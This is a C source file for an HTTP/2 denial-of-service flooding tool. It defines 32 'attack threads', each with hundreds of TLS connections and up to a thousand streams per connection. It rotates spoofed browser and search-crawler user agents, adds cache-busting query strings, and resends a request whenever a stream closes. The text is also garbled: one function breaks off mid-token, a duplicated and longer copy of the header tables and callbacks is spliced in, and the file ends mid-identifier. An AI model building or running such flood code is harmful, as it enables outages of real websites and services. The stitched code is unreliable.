#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>
#include <assert.h>
#include <errno.h>
#include <stdatomic.h>
#include <stddef.h>
#include <signal.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/crypto.h>
#include <nghttp2/nghttp2.h>

#define NUM_ATTACK_THREADS 32
#define CONCURRENT_CONNECTIONS_PER_THREAD 512
#define MAX_CONCURRENT_STREAMS_PER_CONNECTION 1000
#define CONNECTION_TIMEOUT_NS 5000000000L

#define C_RESET "\x1b[0m"
#define C_GREEN "\x1b[32m"
#define C_BOLD  "\x1b[1m"
#define C_RED   "\x1b[31m"
#define C_YELLOW "\x1b[33m"
#define C_BLUE  "\x1b[34m"

// Global variables for timing and statistics
volatile int g_should_stop = 0;
atomic_ullong g_total_requests = 0;
atomic_ullong g_successful_requests = 0;
atomic_ullong g_failed_requests = 0;
time_t g_start_time;
int g_attack_duration = 0;

static const char* user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Mobile Safari/537.36"
};

static const char* accepts[] = {
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/webp,image/apng,image/*,*/*;q=0.8"
};

typedef enum { CONN_STATE_DISCONNECTED, CONN_STATE_CONNECTING, CONN_STATE_HANDSHAKING, CONN_STATE_CONNECTED } connection_state;
typedef struct connection_s { int fd; SSL *ssl; nghttp2_session *ngh2_session; int thread_id; int epoll_fd; struct timespec last_activity; connection_state state; uint32_t stream_counter; } connection_t;

typedef struct {
    int thread_id;
    unsigned int rand_seed;
    const char* user_agent;
    size_t user_agent_len;
    const char* accept_header;
    size_t accept_header_len;
    char path_with_query[2048];
    size_t base_path_len;
    char origin_header[512];
    size_t origin_header_len;
    char referer_header[1024];
    size_t referer_header_len;
} thread_context_t;

thread_context_t contexts[NUM_ATTACK_THREADS];
struct sockaddr_storage g_remote_addr;
SSL_CTX *g_ssl_ctx;
char g_target_host[256];
char g_target_path[1024];
static pthread_mutex_t *ssl_locks;

#define SESSION_POOL_SIZE 64
_Atomic(SSL_SESSION*) g_session_pool[SESSION_POOL_SIZE];
atomic_uint g_session_pool_idx = 0;

static void submit_new_request(connection_t *conn);
static void reset_connection(connection_t *conn);
static void do_handshake(connection_t *conn);
void locking_callback(int mode, int n, const char *file, int line) { if (mode & CRYPTO_LOCK) pthread_mutex_lock(&ssl_locks[n]); else pthread_mutex_unlock(&ssl_locks[n]); }
unsigned long thread_id_callback(void) { return (unsigned long)pthread_self(); }

void signal_handler(int sig) {
    g_should_stop = 1;
    printf("\n=��� Attack stopped by user\n");
}

void print_statistics() {
    time_t current_time = time(NULL);
    double elapsed = difftime(current_time, g_start_time);
    unsigned long long total = atomic_load(&g_total_requests);
    unsigned long long success = atomic_load(&g_successful_requests);
    unsigned long long failed = atomic_load(&g_failed_requests);

    double rps = elapsed > 0 ? total / elapsed : 0;
    double success_rate = total > 0 ? (success * 100.0) / total : 0;

    printf("\r" C_BLUE "=��� [%.0fs] " C_GREEN "RPS: %.0f " C_YELLOW "Total: %llu " 
           C_GREEN "Success: %llu (%.1f%%) " C_RED "Failed: %llu" C_RESET, 
           elapsed, rps, total, success, success_rate, failed);
    fflush(stdout);
}

int new_session_cb(SSL *ssl, SSL_SESSION *session) {
    unsigned int idx = atomic_fetch_add_explicit(&g_session_pool_idx, 1, memory_order_relaxed) % SESSION_POOL_SIZE;
    SSL_SESSION *new_sess = SSL_SESSION_dup(session);
    if (!new_sess) return 0;
    SSL_SESSION *old_sess = atomic_exchange_explicit(&g_session_pool[idx], new_sess, memory_order_relaxed);
    if (old_sess) SSL_SESSION_free(old_sess);
    return 1;
}

ssize_t send_callback(nghttp2_session *session, const uint8_t *data, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv; ERR_clear_error(); clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    rv = SSL_write(conn->ssl, data, length);
    if (rv <= 0) { int err = SSL_get_error(conn->ssl, rv); if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ) return NGHTTP2_ERR_WOULDBLOCK; atomic_fetch_add(&g_failed_requests, 1); return NGHTTP2_ERR_CALLBACK_FAILURE; }
    return rv;
}

ssize_t recv_callback(nghttp2_session *session, uint8_t *buf, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv; ERR_clear_error(); clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    rv = SSL_read(conn->ssl, buf, length);
    if (rv < 0) { int err = SSL_get_error(conn->ssl, rv); if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) return NGHTTP2_ERR_WOULDBLOCK; atomic_fetch_add(&g_failed_requests, 1); return NGHTTP2_ERR_CALLBACK_FAILURE; }
    if (rv == 0) return NGHTTP2_ERR_EOF;
    atomic_fetch_add(&g_successful_requests, 1);
    return rv;
}

int on_stream_close_callback(nghttp2_session *session, int32_t stream_id, uint32_t error_code, void *user_data) {
    connection_t *conn = user_data;
    atomic_fetch_add(&g_total_requests, 1);
    if (!g_should_stop) submit_new_request(conn);
    return 0;
}

static void submit_new_request(connection_t *conn) {
    if (!conn || conn->state != CONN_STATE_CONNECTED || !conn->ngh2_session || g_should_stop) return;

    thread_context_t* ctx = &contexts[conn->thread_id];

    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);

    int query_len = sprintf(ctx->path_with_query + ctx->base_path_len, "cb=%ld%09ld&t=%u&r=%u&v=%ld", 
                           ts.tv_sec, ts.tv_nsec, rand_r(&ctx->rand_seed), rand_r(&ctx->rand_seed), ts.tv_sec % 1000000);
    size_t final_path_len = ctx->base_path_len + query_len;

    const nghttp2_nv headers[] = {
        { (uint8_t*)":method", (uint8_t*)"GET", sizeof(":method") - 1, sizeof("GET") - 1, NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)":scheme", (uint8_t*)"https", sizeof(":scheme") - 1, sizeof("https") - 1, NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)":authority", (uint8_t*)g_target_host, sizeof(":authority") - 1, strlen(g_target_host), NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)":path", (uint8_t*)ctx->path_with_query, sizeof(":path") - 1, final_path_len, NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)"user-agent", (uint8_t*)ctx->user_agent, sizeof("user-agent") - 1, ctx->user_agent_len, NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)"accept", (uint8_t*)ctx->accept_header, sizeof("accept") - 1, ctx->accept_header_len, NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)"accept-language", (uint8_t*)"en-US,en;q=0.9", sizeof("accept-language") - 1, sizeof("en-US,en;q=0.9") - 1, NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)"accept-encoding", (uint8_t*)"gzip, deflate, br", sizeof("accept-encoding") - 1, sizeof("gzip, deflate, br") - 1, NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)"origin", (uint8_t*)ctx->origin_header, sizeof("origin") - 1, ctx->origin_header_len, NGHTTP2_NV_FLAG_NONE },
        { (uint8_t*)"referer", (uint8_t*)ctx->referer_header, sizeof("referer") - 1, ctx->referer_header_len, NGHTTP2_NV_FLAG_NONE }
    };

    nghttp2_submit_request(conn->ngh2_session, NULL, headers, sizeof(headers)/sizeof(headers[0]), NULL, NULL);
}

static void reset_connection(connection_t *conn) {
    if (g_should_stop) return;

    if (conn->fd != -1) { epoll_ctl(conn->epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL); close(conn->fd); conn->fd = -1; }
    if (conn->ngh2_session) { nghttp2_session_del(conn->ngh2_session); conn->ngh2_session = NULL; }
    if (conn->ssl) { SSL_free(conn->ssl); conn->ssl = NULL; }
    conn->state = CONN_STATE_DISCONNECTED;
    conn->stream_counter = 0;

    if (g_should_stop) return;

    conn->fd = socket(g_remote_addr.ss_family, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (conn->fd == -1) return;

    int one = 1;
    setsockopt(conn->fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    int ret = connect(conn->fd, (struct sockaddr*)&g_remote_addr, (g_remote_addr.ss_family == AF_INET) ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6));
    if (ret == -1 && errno != EINPROGRESS) { close(conn->fd); conn->fd = -1; return; }
    conn->state = (ret == 0) ? CONN_STATE_HANDSHAKING : CONN_STATE_CONNECTING;
    clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);

    conn->ssl = SSL_new(g_ssl_ctx);
    SSL_set_fd(conn->ssl, conn->fd);
    SSL_set_connect_state(conn->ssl);
    SSL_set_tlsext_host_name(conn->ssl, g_target_host);

    unsigned int idx = rand_r(&contexts[conn->thread_id].rand_seed) % SESSION_POOL_SIZE;
    SSL_SESSION *sess = atomic_load_explicit(&g_session_pool[idx], m    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.82 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/100.0.4896.88 Safari/537.36",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"
};

static const char* accepts[] = {
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/webp,image/apng,image/*,*/*;q=0.8",
    "application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/css,*/*;q=0.1",
    "application/javascript, */*;q=0.8",
    "application/xml",
    "text/plain",
    "application/json",
    "text/xml",
    "application/x-javascript",
    "text/javascript",
    "application/ld+json",
    "application/rss+xml",
    "application/atom+xml",
    "image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
    "video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5",
    "audio/webm,audio/ogg,audio/wav,audio/*;q=0.9,application/ogg;q=0.7,video/*;q=0.6;*/*;q=0.5",
    "application/pdf,application/postscript,*/*;q=0.8",
    "application/octet-stream",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/event-stream",
    "application/vnd.api+json",
    "application/hal+json",
    "application/vnd.collection+json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "application/json;charset=UTF-8",
    "text/html;charset=UTF-8",
    "application/x-protobuf",
    "application/grpc",
    "application/msgpack"
};

typedef enum { CONN_STATE_DISCONNECTED, CONN_STATE_CONNECTING, CONN_STATE_HANDSHAKING, CONN_STATE_CONNECTED } connection_state;
typedef struct connection_s { int fd; SSL *ssl; nghttp2_session *ngh2_session; int thread_id; int epoll_fd; struct timespec last_activity; connection_state state; uint32_t stream_counter; } connection_t;

typedef struct {
    int thread_id;
    unsigned int rand_seed;
    const char* user_agent;
    size_t user_agent_len;
    const char* accept_header;
    size_t accept_header_len;
    char path_with_query[2048];
    size_t base_path_len;
    char origin_header[512];
    size_t origin_header_len;
    char referer_header[1024];
    size_t referer_header_len;
} thread_context_t;

thread_context_t contexts[NUM_ATTACK_THREADS];
struct sockaddr_storage g_remote_addr;
SSL_CTX *g_ssl_ctx;
char g_target_host[256];
char g_target_path[1024];
static pthread_mutex_t *ssl_locks;

#define SESSION_POOL_SIZE 64
_Atomic(SSL_SESSION*) g_session_pool[SESSION_POOL_SIZE];
atomic_uint g_session_pool_idx = 0;

static void submit_new_request(connection_t *conn);
static void reset_connection(connection_t *conn);
static void do_handshake(connection_t *conn);
void locking_callback(int mode, int n, const char *file, int line) { if (mode & CRYPTO_LOCK) pthread_mutex_lock(&ssl_locks[n]); else pthread_mutex_unlock(&ssl_locks[n]); }
unsigned long thread_id_callback(void) { return (unsigned long)pthread_self(); }

int new_session_cb(SSL *ssl, SSL_SESSION *session) {
    unsigned int idx = atomic_fetch_add_explicit(&g_session_pool_idx, 1, memory_order_relaxed) % SESSION_POOL_SIZE;
    SSL_SESSION *new_sess = SSL_SESSION_dup(session);
    if (!new_sess) return 0;
    SSL_SESSION *old_sess = atomic_exchange_explicit(&g_session_pool[idx], new_sess, memory_order_relaxed);
    if (old_sess) SSL_SESSION_free(old_sess);
    return 1;
}

ssize_t send_callback(nghttp2_session *session, const uint8_t *data, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv; ERR_clear_error(); clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    rv = SSL_write(conn->ssl, data, length);
    if (rv <= 0) { int err = SSL_get_error(conn->ssl, rv); if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ) return NGHTTP2_ERR_WOULDBLOCK; return NGHTTP2_ERR_CALLBACK_FAILURE; }
    return rv;
}

ssize_t recv_callback(nghttp2_session *session, uint8_t *buf, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv; ERR_clear_error(); clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    rv = SSL_read(conn->ssl, buf, length);
    if (rv < 0) { int err = SSL_get_error(conn->ssl, rv); if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) return NGHTTP2_ERR_WOULDBLOCK; return NGHTTP2_ERR_CALLBACK_FAILURE; }
    if (rv == 0) return NGHTTP2_ERR_EOF;
    return rv;
}

int on_stream_close_callback(nghttp2_ses
